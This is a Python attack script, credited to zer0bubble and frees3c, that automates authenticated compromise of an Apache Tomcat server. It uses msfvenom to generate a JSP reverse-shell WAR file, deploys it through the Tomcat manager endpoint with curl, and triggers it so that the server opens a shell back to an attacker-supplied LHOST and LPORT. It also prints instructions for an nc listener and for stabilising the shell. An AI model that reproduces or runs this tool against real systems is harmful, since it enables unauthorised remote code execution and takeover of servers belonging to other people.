#!/usr/bin/env python3
import sys
import os
import argparse


banner = print('''  _______                        _   ___             
 |__   __|                      | | / _ \            
    | | ___  _ __ ___   ___ __ _| || (_) |           
    | |/ _ \| '_ ` _ \ / __/ _` | __\__, |           
    | | (_) | | | | | | (_| (_| | |_  / /            
  __|_|\___/|_| |_| |_|\___\__,_|\__|/_/   __        
 |  __ \           | |         \ \        / /        
 | |  | | ___ _ __ | | ___  _   \ \  /\  / /_ _ _ __ 
 | |  | |/ _ \ '_ \| |/ _ \| | | \ \/  \/ / _` | '__|
 | |__| |  __/ |_) | | (_) | |_| |\  /\  / (_| | |   
 |_____/ \___| .__/|_|\___/ \__, | \/  \/ \__,_|_|   
             | |             __/ |                   
             |_|            |___/                    


    -by zer0bubble & frees3c
    ''')

# Setup Argparse
parser = argparse.ArgumentParser(
    description="Tomcat Authenticated .war upload/shell trigger.")
parser.add_argument("-t",  "--target",   help="Remote host IP")
parser.add_argument("-P",  "--port",     help="Remote port to target")
parser.add_argument("-p",  "--password", help="tomcat admin password.")
parser.add_argument("-u",  "--user",     help="Tomcat username")
parser.add_argument("-Lp", "--LPORT",    help="Local Port for reverse shell")
parser.add_argument("-Lh", "--LHOST",    help="Local host IP")

# if no arguments are given show usage.
if len(sys.argv) == 1:
    parser.print_usage()
    sys.exit(1)

# Define and assign the variables
args = parser.parse_args()
TARGET = args.target
LPORT = int(args.LPORT)
USER = args.user
PORT = int(args.port)
LHOST = args.LHOST
PASSWORD = args.password


def create_war():
    """
    creates .war file containing the jsp reverse shell
    """
    WAR = "msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s + LPORT=%s -f war > shell.war" % (LHOST, LPORT)
    print("Creating malicious war file")
    try:
        os.system(WAR)
        print("Payload created >> shell.war")
        os.system("sleep 2")
    except OSError as error:
        print(error)


baseurl = "http://%s:%s" % (TARGET, str(PORT))


def deploy():
    """
    Uploads and deploys shell.war to tomcat9.
    """
    targeturl = baseurl + "/manager/text/deploy?path=/shell&update=true"
    PAYLOAD = "curl --upload-file shell.war -u %s:'%s' '%s'" % (
        USER, PASSWORD, targeturl)
    # print(PAYLOAD)
    print("* Uploading and deploying shell.war..")
    os.system(PAYLOAD)
    os.system("sleep 1")


def reverse_shell():
    """
    Fetches the reverse shell from '/shell/'.
     ** note: make sure nc is running to recieve shell.
    """
    print("* Triggering reverse_shell..")
    trigger = "curl %s/shell/" % (baseurl)
    os.system(trigger)
    print(
        """Stabalize shell with:
        python3 -c 'import pty;pty.spawn('/bin/bash')'"""
    )


if __name__ == "__main__":
    print(banner)
    create_war()
    print(
        """Make sure ncat is running to receive reverse shell.
         \n `nc -lvnp <LPORT>` """)
    os.system("sleep 3")
    deploy()
    reverse_shell()
